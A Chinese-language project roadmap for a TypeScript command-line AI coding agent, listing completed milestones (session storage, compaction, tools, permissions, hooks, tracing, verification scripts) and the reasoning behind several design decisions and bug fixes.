   # 🗺️ 项目开发路线图

> 按**底层依赖 → 重要程度**排序。下层模块完成后才能支撑上层功能。

## ✅ 已完成

> 表中每行末尾的「全库 N 套 M 项」是**该里程碑当时**的口径，属**历史记账**（像追加日志一样只写不改），
> 不是现状；当前口径唯一来源是 [TESTING.md](./TESTING.md)，且其中那句统计已交给生成区自动维护。
> **2026-09-11 起新行不再重复全库口径** —— 它此前是一张"穿着快照外衣的追加日志"，逼得数字校验为它
> 特判"只认末行"（否则改一次测试就得回头改写历史行）；本轮去重把那个特例连根删了。

| 模块 | 说明 |
|------|------|
| 项目骨架搭建 | ESM + TypeScript 严格模式，core/harness/runtime/io/utils/llm 分层 |
| Harness 启动编排 | check() → main() 模式，闭包工厂创建 Runtime |
| REPL 交互循环 | getUserInput() → runtime.prompt() → onToken 流式输出 |
| LLM Provider 抽象 | LLMProvider 接口 + DeepSeek/Anthropic 实现（chat + stream） |
| Session 存储接口 | SessionStorage 接口 + InMemorySession + MockSession |
| 配置检查 | config/active-config.json 读取 → createProvider → CheckResult 注入 Runtime |
| 流式输出 | SSE 解析 + async generator + onToken 回调逐字显示 |
| **会话树存储（P0）** | JsonlSessionStorage 升级为 entry 树 + leaf + fork + compaction |
| **上下文管理（P0）** | 超限压缩为 compaction entry 入树，增量判断 |
| **命令系统（P1）** | 自动扫描加载：/help /clear /model /edit_model /usage /history /sessions /diagnostics |
| **模型切换（P1）** | /model 两级导航选供应商+模型，/edit_model 修改配置，运行时热替换 LLM |
| **对话历史（P1）** | /history 查看/分叉，fork 复制前缀到新文件（不破坏原历史） |
| **工具系统（P2）** | 内置工具 + function calling（结构化 tool_calls）。工具数随 P7 增补：落地时 4 个（read/write/grep/bash），现为 7 个（ls/read/write/edit/grep/bash/todo） |
| **技能系统（P2）** | SkillLoader 加载 .pi/skills/*.md 模板 |
| **事件订阅（P3）** | PromptEventEmitter subscribe/emit，stream_text/tool_call/error 等事件 |
| **多会话管理（P3）** | /sessions 切换/新建，/history 分叉出多分支 |
| **配置系统增强（P4）** | config/manager 配置分层（环境变量>全局>项目）+ Provider 对象抽象 + /model 自定义供应商 |
| **错误日志与诊断（P4）** | Diagnostic 公共类型 + runtime 诊断队列 + /diagnostics 查看 + debug-runtime.log 落盘 |
| **启动自检增强（P4）** | check() 逐项检查（配置/API key/连通性/模型列表）+ 严重度分级 + check 事件 |
| **可观测性增强（P6）** | 事件语义层：总线盖 at/seq/turnId + 打卡机 trace()/beginSpan() + 四组骨架 span + 便签通道 + trace-log watcher 落 JSONL + L3 两条流式协议的真实 usage + SpanCollector 公共配对件与 /traces 内置命令 |
| **启动提速（P6）** | 第一档网络探测后台化 + 第二档启动关键路径 0 网络请求（模型列表内存预热 + /model 按需现拉） |
| **精准编辑工具（P7）** | `edit`：oldText 唯一命中才改，0 命中 / 多命中都拒绝且一字不落盘（多命中回候选行号），CRLF 与 BOM 字节级保真；配套 `ToolDefinition.permissionDetail?` 让权限弹窗看得清改哪里 |
| **授权边界精确化（P6）** | 授权匹配从“args JSON 前 80 字符 + 前缀匹配”换成“工具定义的边界 + 精确匹配”（`ToolProvider.permissionKey?`），`clear()` 接进会话生命周期；关掉架构债 #10 |
| **工具可靠性修复（P7）** | `grep` 从“shell 出去调系统 grep”改成纯 Node 遍历（改前在中文 Windows 上**一次也搜不到**，且把“命令跑不起来”谎报成 `[NO_MATCH]`），四类返回前缀分开；`bash` 的子进程输出解码从硬编码 GBK 改成“UTF-8 严格探测 + 平台代码页回退”（`decodeChildOutput`），行数/字符数统一按截断前算；配套 `scripts/verify-tools.ts` 74 项，全库 15 套 556 项 |
| **失败分类补全（P7）** | `[INVALID]`（参数不合法）计入失败——改前“重复失败保护”对“模型把参数写错”这一整类**完全失效**（实测 grep 缺 `pattern` 连传三次，`if (failed)` 一次也没进、`[系统提示]` 一次也没注入）；根因是分类表里没给它留位置（判定式是白名单，落不进任何一类就等于默认不计）。配套 A4/A5 **对照组**（有效否定 `[NO_MATCH]` 仍不计），并查出两条**假绿**源码断言（E11/C4 的子串匹配在第三个前缀同行时照样绿）改为名单精确相等，全库 15 套 560 项 |
| **工具参数校验框架（P6）** | 新增 `tools/spec.ts`（自研，**不引** Zod / TypeBox）：一份 spec 派生三样——发给 LLM 的 `parameters` / 运行时 `parse` / handler 入参类型，6 个工具全走 `defineTool`；`ToolDefinition.parse?` + `registry.execute()` 接线，让那份 Schema **第一次真正生效**（改前 `execute()` 只有 3 行、`tool.parameters` 一个字段都没读，实测缺参 / 传对象 / 传 Schema 里不存在的参数名——三次全部 `[OK]`）。堵住 `String(val)` 那个“永远通过的校验”留下的四个类型盲区与多余参数静默忽略；配套 `scripts/verify-spec.ts` 45 项 + `fixtures/tool-schemas-baseline.json` 护栏（Schema 逐字未变），全库 16 套 605 项 |
| **内层引导（P7）** | steering 的消费点从**外层循环**下沉到**内层工具边界**：`AgentLoopOptions.takeSteer?` 在工具跑完、下一次 `llm.stream()` 之前取件，追加进最后一条 tool 结果，让用户执行中途插入的话进**本轮**上下文。改前 `AgentLoop` 的 `for` 循环**一处队列检查都没有**，steer 与 followUp 的实质差别只剩优先级——名字许了没兑现的承诺。**不能新开 user 消息**：tool 结果在 `anthropic.ts` 里已是 `user` 角色，连续两条 user 直接 400，故沿用重复失败提示 / 收尾提示的“寄生追加”手法。两条“不吞消息”护栏（本轮无工具调用 → 不取件；已是最后一轮 → 不取件）经**变异测试**验证承重；端到端实测 3 次 LLM 往返内送达（摘掉接线立刻变 4 次）；配套 `scripts/verify-steering.ts` 28 项，全库 17 套 633 项 |
| **内层引导落盘 + 同角色归并（P7 收尾）** | 借债 11 关闭：`runSingleTurn` 在 `appendMessage('assistant')` **之前**把被内层吸收的引导落盘为独立 user 条目（内容带 `STEER_PREFIX` = `[用户引导] `），时序忠实；`toAnthropicMessages` 的 `user` 分支相应从**无条件 push** 改成**能并则并**（与既有的连续 tool 结果合并同层同手法）——这个洞此前**不可达**，落盘后才会被踩到；`/history` 把这类条目标成 `⚡ 中途引导`。落盘后 OpenAI 兼容路径会真的发出连续两条 user（原样透传、零归一化），标准语义容忍，已用 S10 钉成**登记性断言**而非埋在注释里。**债 11 的一半前提同时被核查推翻**：官方 API 参考称连续同角色轮会被服务端合并（5 个官方镜像逐字一致），与第三方 400 报告冲突且本机无法裁定，故修法与前提**解耦**（本地归并幂等——服务端本会合并时无害、真拒绝时救命）。配套 `verify-steering.ts` 28 → 48 项 + 四组变异测试各自精准变红，全库 17 套 653 项 |
| **文档数字校验 + 稳定锚点（P7 收尾）** | `Log/` 的数字纪律此前**全靠人肉**：套数与项数在四份文档各写一遍、**每套的项数还在两处各列一遍**，而 `verify-docs.mjs` 只管锚点、不管数字——这是整套文档体系里唯一没有机器兜底的地方（历史也证明它会漂：653 / 633 / 605 曾同时躺在不同文件里）。新增 `scripts/check-doc-numbers.mjs`：**白名单式**拿 `run-verify` 汇总出的真值去核对「当前值」23 处 + 两处逐套表格（必须白名单——全库盲扫会命中追加日志与 ROADMAP 旧行里的**历史数字**，那些改了才是篡改历史快照），且**不计入项数**（否则"总项数对不对"取决于"有没有把校验自己算进去"，成了自指）。配套 `verify-doc-numbers.ts` 31 项（纯函数喂**合成文档**造红、含两组对照组）与三组变异测试。**上线首跑即点名 18 处漂移**，并顺带查出 TESTING 第三节两处**既有**错数（`check` 写 8 实际 10、`if (failed > 0) process.exit(1)` 写 1 实际 2）。另一半是**锚点解耦**：`verify-docs.mjs` 的锚点集合扩成「标题 slug ∪ 显式 id」，**新日志条目一律带 `<a id="log-<日期>-<短名>"></a>`**——锚点不再由标题文字算出，引用短、纯 ASCII、且不随日后重述标题而断，配套显式锚点卫生段（不重复 / 命名守约定 / **非空**）与 `ARCHITECTURE_LOG_RULES.md` 的约定。全库 18 套 688 项 |
| **文档去重 + 生成区（P7 收尾）** | 治的是根因，不是"谁忘了改"。上一轮把 23 处手抄都加进白名单**看着**，那治的是症状；真正的病是**同一个事实被抄了太多份**。本轮两路收口：**去重（L1）**——`ARCHITECTURE.md` 的测试行与债 5、`目录.md` 的职责表与 scripts/ 树逐套项数、`ROADMAP.md` 已完成表末行，全部不再重述当前口径、改为引用 TESTING.md，对应白名单条目整段删除（含 ROADMAP 那条必须"只认末行"的特判——它本来就是一张穿着快照外衣的追加日志）；**生成区（L2）**——TESTING 顶部与第二节划出 `<!-- BEGIN AUTOGEN:… -->` 区块，由新增的 `npm run docs:sync` 从**实测真值**写入，人一个字不碰。配套三个零依赖脚本：`autogen.mjs`（区段解析 + 渲染，纯函数，**写与查共用同一份模板**，故两边定义不可能分家）、`collect-stats.mjs`（真值采集，`run-verify` 与 `docs-sync` 共用同一份，避免"真值分家"）、`docs-sync.mjs`（写盘命令）。两条硬设计：**`verify` 保持只读**（`gofmt -l` 范式，不一致只报红、绝不顺手改文件）、**落盘渲染后的 Markdown 而非 `{{占位符}}`**（`Log/` 是给人**和** Agent 的 Read 直接读的，占位符会让两边都读到垃圾；这也正是它与零构建管线约束的兼容点）。白名单 **23 → 11 处**；顺带改正 TESTING 一处叙事错数（`verify-docs.mjs` 的"14 → 17"实为 **18**：+3 是新段，另 +1 是 ①② 统计的文档数从 6 涨到 7）。**本行刻意不写全库口径**，见上方表注 |
| **任务清单 C 方案（P7 收尾）** | 把 `TASK.md` 那套"文件即状态"（模型用 `write` 全量重抄清单、harness 用一个正则数复选框）升级成"**工具即状态**"。新增 `src/todo/store.ts`：`TaskStore` 是清单的**内存真相源**（`add/start/done/clear` 增量变更 + "唯一进行中"不变量 + `render()`/`fromMarkdown()` **严格互逆**）；新增第 7 个内置工具 `todo`（`op`/`index`/`text` 全标量、**返回值即带序号的整份清单**），模型改一个勾只传增量、不再重抄。`runtime.ts` 删掉逐请求读文件的 `loadTaskMemory()`，注入 `task` 层与轮数预算 / `thinking auto` 一律改读 store；`TASK.md` 降级为**投影 + 启动种子**（写盘由工具在变更后做、读盘只在 `main.ts` 启动时做一次），"全勾选即删"随之迁进 `projectToFile`/`loadFromFile`。配套 `scripts/verify-todo.ts` 50 项（含 render-parse 互逆的**属性测试**与两处"有没有未完成"判定**恒等**的对照） |
| **任务清单上屏（P7 收尾·续）** | C 方案把真相源搬进内存后，暴露出**没人通知 UI** 的缺口：`todo` 工具改完 `TaskStore` 就结束，而它拿不到事件总线，于是终端里根本不存在任务列表。补三样：① `TaskStore.onChange()` 观察者（**零依赖**，只是回调集合，不把 `todo/` 拖进 runtime 依赖圈）；② 输入框正上方的**常驻面板**（完成 `✓` / 进行中 `▶` / 待办 `☐`，空清单零行即收起），渲染是 `io/ui/task-panel.ts` 里的**纯函数**，不必起终端就能验；③ `/tasks` 命令 + `TaskStore.lastCompleted()` 快照，解决"面板收起 + TASK.md 已删之后上一轮查不到"——快照记录时机是"最后一项被 `done` 的那一刻"而非清空时。另把清单排版收敛成唯一的 `static renderItems()`，glyph 只有一处定义 |

---

## 🔜 待开发（按优先级降序）

### P0 — 核心基础设施（项目运转的必要条件）

- [x] **持久化存储** — 实现 JSONL 文件存储后端（JsonlSessionStorage），对话历史可保存/恢复
  - 依赖：SessionStorage 接口已就绪
  - 影响：没有持久化，每次重启对话丢失
- [x] **上下文管理（上下文窗口控制）** — 超限时保留最近 10 条，丢弃早期消息并标注摘要
  - 采用：消息数量超过 20 条时触发滑动窗口压缩
  - 影响：LLM 上下文窗口有限，超过后对话崩塌

### P1 — 交互体验（Agent 可用的基础）

- [x] **命令系统** — 支持可扩展的 `/` 命令（`/help`, `/clear`, `/model`, `/sys` 等）
  - 依赖：无（`/exit` 已有，只需抽成注册表）
- [x] **模型选择与切换** — 运行时切换模型/Provider，不再写死在 JSON 里
  - 依赖：LLM Provider 抽象已就绪，只需加 CLI 参数或 `/model` 命令
- [x] **对话历史管理** — 展示历史消息，支持回溯、编辑（/history 分叉）

### P2 — Agent 能力扩展

- [x] **工具系统（Tool System）** — Agent 调用外部工具的能力（文件读写、bash、搜索等）
  - 依赖：上下文管理、命令系统
  - 影响：没有工具，Agent 只能聊天不能操作
- [x] **技能系统（Skill System）** — 可加载的技能模板（`.pi/skills/*.md`）
  - 依赖：命令系统、工具系统

### P3 — 高级交互

- [x] **事件订阅模式** — 用 subscribe/emit 替代 onToken 回调，支持 stream_token / tool_call / error 等细粒度事件
  - 依赖：无（可与当前回调模式并行）
  - 驱动因素：UI 需要区分"正在输出"、"正在调工具"、"出错了"等状态
- [x] **多会话管理** — `/new`（新会话）、`/fork`（分叉）、`/switch`（切换）
  - 依赖：持久化存储、命令系统
- [x] **RPC 模式** — JSON-RPC over stdin/stdout，供编辑器插件调用（非流式；流式 TODO）
  - 依赖：命令系统、事件订阅
  - 注：非流式 chat 一次性返回；Pi 式流式（text_delta 通知）留 TODO
  - **补记（2026-09-11 核实）**：TODO **仍在原处**（`rpc.ts` 第 12 行），9 个方法逐个核对无误
    （chat / ping / list_commands / get_diagnostics / list_sessions / switch_session /
    create_session / clear / get_session_info）。本条**不再只是"留个 TODO"**——它已升格为独立
    立项，理由与方案见下面 **P8 第一条**：传输层与 ACP 同源，是"让编辑器替我们做 UI"的最短路径

### P4 — 可靠性工程

- [x] **配置系统增强** — 从 `config/api.json` 扩展到分层配置（全局/项目/会话级）
- [x] **错误日志与诊断** — 结构化的错误收集、诊断报告
- [x] **启动自检增强** — 网络连通检测、API key 有效性验证、模型列表拉取

### P5 — 架构演进（规模化）

- [x] **多系统拆分** — 从单 runtime 链拆分为独立子系统（存储/执行/检索等），按 Pi 模式：
  - 每个子系统一个接口（core/ 9 接口：storage/tools/permission/events/compaction/loop/commands/diagnostics/compaction-store）
  - 实现分类：执行类 Service（Impl）/ 能力提供类 Provider / 数据类 Storage/Store/Bus
  - 依赖注入组装（main 组装，Runtime 只依赖接口，全部必注入）
  - 命名规范统一：执行类 Service、提供类 Provider、命令迁 commands/builtin/

### P6 — 成熟度补齐（对标 Cline / Pi）

> 功能 P0-P5 已齐，以下为对标成熟 Agent 框架（Cline/Pi）缺失的能力，按价值排序。

- [x] **正式测试套件** —（2026-09-03 关闭，**不引入 vitest**）原案是“引入 vitest，为 session/compaction/commands/rpc 等子系统建立正式单测（当前仅临时脚本）”；痛点“P5 大重构后零回归保护”已由另一条路解决——`scripts/` 下 **12 套零依赖验证脚本、359 项断言**，`npm run verify` 一条命令串跑、退出码可直接交给 CI（原先“只能手工循环跑”的缺口由本轮新增的 `run-verify.mjs` 补上）。四个子系统里 session 已有专套（`verify-session.ts` 47 项），compaction / commands / rpc 仍靠间接覆盖，这部分缺口保留在 TESTING.md 第七节
  - 理由：P5 大重构后零回归保护，改 bug 可能悄悄破坏别处
  - 对标：Pi 有 vitest.config.ts + 完整测试
- [x] **系统提示词模板层** —（2026-09-04 核实后关闭，实现与原案不同）原案：从 runtime.ts 硬编码字符串抽为模板（system-prompt.ts），支持按场景选择
  - 已落地的是 `context/system-prompt.ts` 的 `SystemPromptServiceImpl`：配置驱动 + 五层分层（core → tools → skills → task → summary，稳定前缀与变化内容分开，为缓存友好）+ 段落可插拔（`context/sections/` 三个内置 + `extensions/sections/` 用户扩展）+ hook 可改写（`before_build` / `before_request`）
  - “按场景选择”没做成模板枚举，而是靠 `SectionFn` 收 `ctx` 自行决定返不返回内容（如 tools 段在 `ctx.tools` 为空时返回 undefined 直接跳过本段），新增一个场景不必改模板表
  - 理由：硬编码不可扩展，影响 Agent 能力演进
  - 对标：Pi 的 prompt-templates.ts / system-prompt.ts
- [x] **分支摘要** —（2026-09-12 核实后关闭，由另一条路解决）原案：fork 后把旧分支摘要塞回新分支上下文
  - 理由：当前 fork 只复制前缀，新分支 LLM 不知道旧线聊过什么（**此理由经核实不成立，见下**）
  - 对标：Pi 的 branch-summarization.ts
  - 核实结论（2026-09-12）：压缩子系统已顺带覆盖该场景，**不需要新代码**。机制链条——
    ① `forkTo` 把"根 → 分叉点"的**整条前缀原样复制**进新会话文件（原条目的理由"新分支不知道
    旧线聊过什么"不成立，LLM 一直都知道）；② 压缩在**每轮请求前**跑（`runtime.ts` 的
    `maybeCompact`，阈值 20 / 保留 10），fork 来的长前缀在下一轮请求即被压成
    "摘要 + 最近 10 条"；③ 两条路产物相同：文件 = append-only 完整历史（compaction 只追加
    entry、不删旧消息），LLM 视图 = 摘要 + 最近 10 条——"fork 时摘要"与之相比只差摘要生成的
    时机，且压缩在请求前跑，这个时机差省不出任何东西。立项时压缩子系统尚未落地，彼时
    "长对话 fork 无摘要"为真；P0 上下文管理落地后场景被顺带覆盖，与"正式测试套件"条
    （不引 vitest、走自研脚本）同一类"由另一条路解决"。
  - 再补记（2026-09-12 当天，用户拍板仍实现）：上面"不需要新代码"的结论**一半是错的**——
    它建立在"压缩视图长期生效"的假设上，而实现抽查（探针 + 逐行读）发现两个真 bug：
    ① `getMessages()` 没按 firstKeptId 裁剪视图（源码注释写着"被摘要顶替"、代码没做），
    压缩省的 token 只活一轮；② fork 文件的 leaf 标记只有 forkTo 写过一次，之后追加的消息
    与摘要重开即从视图消失（create 的文件没 leaf、走兜底，既有测试没抓到）。修掉之后，
    "fork 摘要"作为**菜单选项**（"带摘要从此继续"，用户自选触发，忠实前缀的审计立场不破）
    才有真实价值——长前缀当场换成"摘要 + 最近 10 条"，不等下一轮阈值触发。实现走
    `CompactionService.compactNow`（强制压缩，与 maybeCompact 共用主体），并顺手把压缩服务
    的 storage 依赖从构造期绑死改为每次调用传入（切会话后摘要写进旧文件的第三个 bug）。
- [x] **Hook 系统** — 工具调用/消息生命周期钩子（beforeToolCall/afterToolCall 等）
  - 理由：扩展 Agent 行为（拦截/转换/记录），当前仅 inputHandlers 简单预处理
  - 对标：Pi 的 hooks.md / Cline 任务生命周期钩子
  - 进度（2026-09-04 核实）：**提示词层与旁观层的钩子已落地**——`EventBus.on(type, handler)` 的返回值经 `emitHook` 收回、能改写流程（现有 `before_build` / `before_request` 两个挂点，`extensions/hooks/` 自动装载），`extensions/watchers/` 只订阅不改流程（ctx 里刻意不给 `on`）；**工具调用生命周期钩子仍无**：全 src/ 搜 `beforeToolCall` / `afterToolCall` / `before_tool` / `after_tool` 零命中，故本条仍留待办。`runtime.onInput()`（输入预处理）也仍空着，见 ARCHITECTURE.md 第四节第 7 条
  - 补记（2026-09-12 完成）：工具生命周期两个发射点落地——`before_tool_call` / `after_tool_call`
    （`agent-loop.ts`，命名跟随既有 kebab 风格而非 Pi 的 camelCase）。语义**可拦截、不可改参**（用户拍板）；
    fail-open（钩子异常 / 形状不对 → 放行）。上句"全 src/ 零命中"就此失效，发射点唯一性由
    `verify-hooks.ts` S1/S2 机器守护。**本条仍剩**：`runtime.onInput()`（输入预处理）依旧空着；
    消息生命周期钩子（LLM 请求前后的用户级挂点）未做——`before_request` 是 system-prompt 内部的，
    对 extensions 开放的只有工具这两个
- [x] **会话仓库层** —（2026-09-12 落地）从 jsonl-storage 抽出 repo 层（会话列表/管理/删除）
  - 理由：区分"单会话存储"与"会话管理"，支持多会话完整操作
  - 对标：Pi 的 jsonl-repo.ts
  - 补记（2026-09-12 完成）：契约在新增 `core/session-repo.ts`（getDir/list/open/create/remove）、
    实现在 `session/jsonl-repo.ts`；`JsonlSessionStorage` 的静态 `listAll` 与 runtime 里的文件名
    规范化整体搬入（列表逻辑单一来源），并补上此前缺失的**删除**——两层守卫（repo 白名单拒穿越 +
    Runtime 拒删当前活跃会话）+ UI 层 disabled。`sessionRepo` 可选注入，缺省回退旧静态路径。
    `verify-repo.ts` 51 项（探针 repo 钉委托、变异测试证明守卫承重）。
- [x] **技能依赖追踪** —（2026-09-12 落地，实现与原案 TODO 不同）声明式依赖：frontmatter `depends: a, b`（逗号分隔、去空白、去重保序）→ `Skill.depends`；`SkillLoader.getDependents(name)` 反查（悬空名字也可查——"谁声明了依赖它"正是排查悬空声明要的形状）；`SkillChange.broken` = 因本次删除而失去依赖的技能名
  - 对标：Pi 的 skills.ts
  - **设计偏差（记入 DECISION_LOG）**：TODO 原写 addDependency / getDependents，落地时**刻意不做 addDependency**——没有真实调用方的公开方法就是本仓库付过三次学费的「支持但未接线」债（runtime.onInput / appendMessage extra / permission.clear）。依赖的声明口唯一走 frontmatter，运行期没有第二个写入方
  - 接线两点：skills-section 标注「依赖 / 缺失」（`ctx.skillDeps` 可选成员，旧 ctx 缺省兼容）；TreeUI 热重载提示行追加「失去依赖」。静态悬空声明（依赖了不存在的技能）**不进 broken**——它不是"本次删除导致的断裂"，由系统提示词的「缺失」标注每轮如实暴露
  - 验证：新增 `verify-skill-deps.ts` 29 项；变异三轮各自精准变红（parseDepends 钉空 → 8 红；broken 恒空 → 3 红；section 忽略标注 → 3 红）
  - 补记（2026-09-12）：本条的另一半**技能热重载已落地**——`SkillLoader` 的
    `startWatch`/`stopWatch`/`reload`/`onChange` 四件套（零依赖 fs.watch + 300ms 防抖 +
    增删差通知，观察者只服务 UI 提示、提示词层每轮现取 getAll() 自愈）；顺带修掉装配
    扫错目录的静默 bug（`SkillLoader('skills')` 实际扫 `skills/skills/`，运行期技能数
    恒为 0）。依赖追踪仍在 TODO（见 verify-skill-watch.ts W32 只摘热重载 TODO）。**以本条为准：依赖追踪已于同日晚落地**
- [x] **工具参数校验框架** —（2026-09-06 落地，实现与原案不同）原案：从手动 requireString 升级为 schema 自动校验
  - 落地的是 `tools/spec.ts`（**自研**，不引 Zod / TypeBox）：5 个构造器（`str` / `strAllowEmpty` / `optStr` / `optPosInt` / `optBool`）覆盖现有 16 个字段，一份 spec 派生三样——`toJsonSchema()` 出发给 LLM 的 parameters、`parseSpec()` 做运行时审核并补默认值、`Infer<typeof spec>` 推 handler 入参类型；`ToolDefinition` 加**可选**成员 `parse?`，`registry.execute()` 在 handler 之前跑它（`ToolInputError` → `[INVALID]`，别的异常穿透），6 个工具全走 `defineTool()`、删掉 4 个校验件共 18 处
  - “自动校验”这一步的实测根据：改前 `execute()` 只有 3 行、`tool.parameters` **一个字段都没读**——造一个 `required: ['mustHave']` 的工具，①什么都不传 ②传一个对象 ③传 Schema 里根本不存在的参数名，三次全部 `[OK]`，所以那份单子的身份是“给模型的建议书”。另堵掉 `String(val)` 那个**永远通过的校验**留下的四个类型盲区（`123` / `{a:1}` / `['src']` / `true` 改前全过关，到文件系统层才报 `[NOT_FOUND]` / `[NOT_FILE]`，归因错层会让模型去猜路径）与多余参数静默忽略（`{pattern:'x', pathh:'typo'}` 让 `path` 退回默认 `'.'`，搜完整个项目还报 `[OK]`）
  - 理由：工具参数校验标准化（原案这句成立，但真病不是“两份副本可能不一致”，而是“没人执行”）
  - 对标：Cline 工具参数 schema 校验——**不引它的依赖**（Zod 还要 `zodToJsonSchema` 这座**有损**的桥，而本项目零运行时依赖是既有立场），三选一取舍见 DECISION_LOG 2026-09-06
  - 剩余（未立项）：`parse` 是可选成员，手写一个不走 `defineTool` 的工具绕过全部校验是合法的（编译期不拦，防线是 verify-spec ⑤/⑥ 段的源码断言）
  - **以本条为准：结构化返回值已于 2026-09-12 落地**（原"剩余"第一项划出）：`ToolResult { status, content }` 五态契约 + 五个构造器唯一入口，agent-loop 分类从 startsWith 前缀解析改读 `toolStatusFails`（唯一判定式）；模型可见文本逐字节不变。见 DECISION_LOG / ARCHITECTURE_LOG 锚点 `log-2026-09-12-tool-result`，verify-tool-result 27 项
- [x] **可观测性增强** — 结构化 trace/span 观测层（2026-09-02 落地：总线 emit() 盖 at/seq/turnId 公共头 + SpanRecorder 打卡机（trace 自动配对 / beginSpan 手动）+ 四组骨架 span 覆盖三重循环（prompt/llm_request/tool_call/compaction）+ note_start/note_end 便签通道 + trace-log hook 落 trace.jsonl，verify-events 55 项）
  - L3 真实 usage 同日补齐：两条流式协议各自取用量（OpenAI 兼容靠 stream_options.include_usage 显式索取 + 撞 400 自动降级，Anthropic 靠 message_start 输入三项相加 + message_delta 输出累计值），AgentLoopResult 逐轮合计、任一轮缺失即整体 null，verify-usage 22 项；实测同一条冒烟的 promptTokens 从估算 26 变真值 2834（估算没算 system prompt 与 5 个工具描述）
  - 对标：Pi 的 docs/observability.md
  - 剩余（未立项，按需再做）：显式 parentId 树形（现靠 turnId + 时间区间包含关系重建）· 51 处裸 console 收编进总线。~~非流式 chat() 的用量回流~~**已于 2026-09-12 落地**：`ChatResult.usage`（非流式真值，API 没报缺省）→ `CompactionResult.usage` 透传 → runtime `bumpUsage` 唯一累加点（主轮 maybeCompact + fork compactNow 两处入账并广播 usage 事件），压缩摘要的消耗自此计入 /usage；verify-compaction-usage 30 项、变异两轮精准变红（途中还揪出 maybeCompact 丢透传的真 bug，已入 CHANGE_LOG）。~~缓存命中率明细~~**已于 2026-09-13 落地**（以本条为准）：`LLMUsage` 加可选 `cacheReadTokens` / `cacheCreationTokens`，明细由服务端结算、本层只搬运，promptTokens 三者和口径不变、缺省不伪报 0；/usage 与 usage 事件带明细，verify-cache-usage 21 项、变异两轮精准变红（锚点 `log-2026-09-13-cache-usage`）
- [x] **/traces 内置命令 + SpanCollector 公共配对件** —（2026-09-03 落地）把 trace-log watcher 里的 span 配对逻辑抽成 runtime/span-collector.ts（契约 SpanCollector / CollectedSpan 进 core/events.ts，与生产端的 SpanRecorder 对称：一个帮打卡、一个帮收段），watcher 从 134 行瘦到 78 行、只剩"开关判定 + 落盘格式 + 退出补记"；新增 /traces 命令就地看最近段的耗时/成败/此刻在跑的是哪段，支持条数与段名过滤；两个消费者各持独立实例（核心命令不反过来依赖可选扩展）；verify-events ⑨ 段 21 项，全量 299 项
  - 理由：看一段耗时不该先开 FLINT_TRACE 落盘、再翻 jsonl 文件；而配对逻辑虽然只有一份，却住在可选扩展里，核心命令拿不到
  - 对标：把观测结果做成内置命令随手可查（而不是只能翻落盘文件）的通行做法；不引入 LangSmith / LangFuse 这类外部服务与依赖，只保留内存环形队列
- [x] **启动提速·第二档：模型列表移出启动关键路径** —（2026-09-02 落地，实现与原案不同）原案是"/models 结果落本地缓存带时间戳（TTL 约 24h）"，调研后发现 getModels() 的 9 个调用点里只有 /model 二级选择器真需要远程列表，落盘那套机械（缓存文件/TTL 失效/baseUrl 变更失效/gitignore）换不到额外收益，改为**内存预热**：删掉 getConfigManager() 里的 init()，启动路径 0 网络请求（实测 check() 760ms → 0.7ms）；main.ts 界面渲染前 fire-and-forget 预热有 key 的几家，/model 二级展开前 ensureModels（5 分钟新鲜期内零等待，还在飞则复用在飞 promise）；Provider 加 modelsFetchedAt 且只在真拿到列表时盖戳；verify-startup 32 项
  - 理由：模型列表几乎不变，没必要每次启动现拉；断网时启动照样过（列表有静态兜底、自检 probeStartup 本就在后台）
  - 对标：Cursor / Cline / Continue 把网络依赖移出启动关键路径的通用手法（"落盘缓存"这一层按本项目实际消费面裁掉，三选一的取舍见 DECISION_LOG 2026-09-02）
- [ ] **启动提速·第三档：预编译发行** — tsc 编译到 dist/，启动脚本改跑编译产物，省掉 tsx 每次启动的即时转译开销；可选再进一步打包单文件二进制（第一/二档完成后收益递减，优先级最低）
  - 理由：解释器冷启动 + 全源码转译是启动时间的固定底噪，编译产物一劳永逸；但收益比前两档小且需配套发行流程（版本/源码映射）
  - 对标：Claude Code / Codex CLI 发行打包 bundle 而非源码现转译
- [x] **现状类文档校准** —（2026-09-03 落地，范围比原案大）ARCHITECTURE.md / TESTING.md / GLOSSARY.md 三份停在项目早期，与代码直接矛盾（2026-09-03 查出具证：分层图仍写 AnthropicProvider 与 ui.ts 为 TODO；TESTING 列的 Agent 类不存在；GLOSSARY 3 条标"计划中"却已落地、2 条指向不存在的文件路径）
  - 理由：append-only 的四份日志天生不会烂，会烂的是"现状快照"；目录.md 因每轮同步所以准，这三份没进这个习惯，越晚校准越多条目需要重写
  - 建议顺序：GLOSSARY 逐条核（共 41 条，新增的 11 条观测层词条是准的，只需校准旧的 30 条）→ TESTING 改写成"10 套 verify + 299 项断言 + RPC 冒烟"的真实测试体系 → ARCHITECTURE 重画分层图（补 core 契约层、工具/权限/压缩/诊断子系统、扩展三口子、观测旁路）
  - 落地：按建议顺序执行，但每一步的实际工作量都比预估大——GLOSSARY 逐条拿代码验证后查出 **23 条失真**（不是只需校准旧的 30 条里的一部分，而是过半），修正后另新增 8 条已验证术语（→ **49 条**，新建 J、U 两节）；TESTING 旧版的示例代码照抄会编译不过（三处类型错 + `new Runtime` 缺 11 个必注入），逐条修不如整份改写，现 7 节 96 行；ARCHITECTURE 分层图扩成 6 层 + 两条横切旁路（209 行），决策 1/2/4/5/6 逐条补现状、对比表 5 行里 4 行已反转故全部重写，并新增第四节"已知架构债"7 条
  - 超出原案：`目录.md` 也跟着校准了一轮（三个幽灵条目 CLAUDE.init.md / src/utils/error-log.ts / src/persistence.ts、core 契约 9→11、内置工具 4→5 漏了 ls、io/ui/permission.ts 实为 permission-prompt.ts、runtime/ 漏 4 项、补 skills/ 与 sessions/）——它虽然每轮同步，但同步的是"新增了什么"，删掉和改名的东西会留下幽灵
  - 校准过程中查出的**代码级**问题（不属文档任务，需另立）：两个同名 `SessionStorage` 接口注释互相矛盾而 `instanceof` 才是现状（core/storage.ts 那版的三个可选成员白定义了）· `AgentConfig` 是死类型 · 压缩用量没回流导致 `/usage` 少算 · `package.json` 无 verify/test 入口且 `clean` 是 `rm -rf dist` 在 Windows 跑不通 · `src/runtime/commands/` 是空目录、`input-handler-demo.ts` 是演示文件，两者去留待定 · 内置 `ls` 工具已落地，下面 P7 的"实用工具补全（ls）"该划掉一半
- [x] **校准查出的代码级问题批量处理** —（2026-09-03 落地）上一条末尾列了 6 个代码级问题，本轮处理掉 5 个（那条是 append-only 的历史记录，里面提到的 `input-handler-demo.ts` 已不存在，以本条为准）：
